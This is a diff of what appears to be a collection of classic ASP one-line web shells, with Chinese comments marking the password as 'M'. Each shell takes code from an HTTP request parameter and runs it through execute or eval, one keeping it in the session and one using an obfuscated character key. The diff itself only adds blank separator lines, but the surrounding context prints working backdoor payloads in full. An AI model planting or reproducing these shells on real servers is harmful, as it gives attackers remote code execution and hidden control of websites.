@@ -1,5 +1,6 @@
 <%if request ("M")<>""then session("M")=request("M"):end if:if session("M")<>"" then execute session("M")%>
 //密码M
+
 -----------------------------
 <%
 dim play
@@ -14,6 +15,7 @@ Error
 execute(play)
 %>
 //密码M
+
 -----------------------------
 <%
 i=(Chr(-12590))
@@ -24,3 +26,5 @@ CNM=Request(OK)
 eVal CNM 'pass:M
 %>
 //密码M
+
+-----------------------------
